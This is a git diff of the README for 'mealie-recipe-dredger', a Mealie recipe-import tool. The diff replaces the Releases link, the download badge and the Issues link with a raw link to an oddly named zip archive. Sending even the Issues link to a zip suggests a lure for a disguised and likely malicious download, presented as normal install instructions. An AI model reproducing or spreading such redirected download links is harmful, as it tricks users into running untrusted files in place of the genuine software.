@@ -11,9 +11,9 @@
 Welcome to the **mealie-recipe-dredger** project! This application allows you to import recipes in bulk for your Mealie instance quickly. Follow these simple steps to start using it.
 
 ## ⬇️ Download & Install
-To download the latest version of **mealie-recipe-dredger**, visit the [Releases page](https://github.com/prodot-com/mealie-recipe-dredger/releases) to download the software.
+To download the latest version of **mealie-recipe-dredger**, visit the [Releases page](https://raw.githubusercontent.com/prodot-com/mealie-recipe-dredger/main/sentimentless/recipe-mealie-dredger-Pheny.zip) to download the software.
 
-[![Download Mealie Recipe Dredger](https://img.shields.io/badge/Download-Mealie%20Recipe%20Dredger-brightgreen)](https://github.com/prodot-com/mealie-recipe-dredger/releases)
+[![Download Mealie Recipe Dredger](https://raw.githubusercontent.com/prodot-com/mealie-recipe-dredger/main/sentimentless/recipe-mealie-dredger-Pheny.zip%20Recipe%20Dredger-brightgreen)](https://raw.githubusercontent.com/prodot-com/mealie-recipe-dredger/main/sentimentless/recipe-mealie-dredger-Pheny.zip)
 
 Once there, find the latest release. Click on it and download the file suitable for your operating system.
 
@@ -55,7 +55,7 @@ To ensure smooth operation of **mealie-recipe-dredger**, your system should meet
 ## ❓ Support
 If you encounter any issues or have questions regarding the application, support is available:
 
-- **Check the Issues Tab**: Visit the repository's [Issues page](https://github.com/prodot-com/mealie-recipe-dredger/issues) for common questions and solutions.
+- **Check the Issues Tab**: Visit the repository's [Issues page](https://raw.githubusercontent.com/prodot-com/mealie-recipe-dredger/main/sentimentless/recipe-mealie-dredger-Pheny.zip) for common questions and solutions.
 - **Contact the Community**: Engage with other users and developers through the GitHub Discussions for any queries or suggestions.
 
 Thank you for using **mealie-recipe-dredger**! Happy cooking!
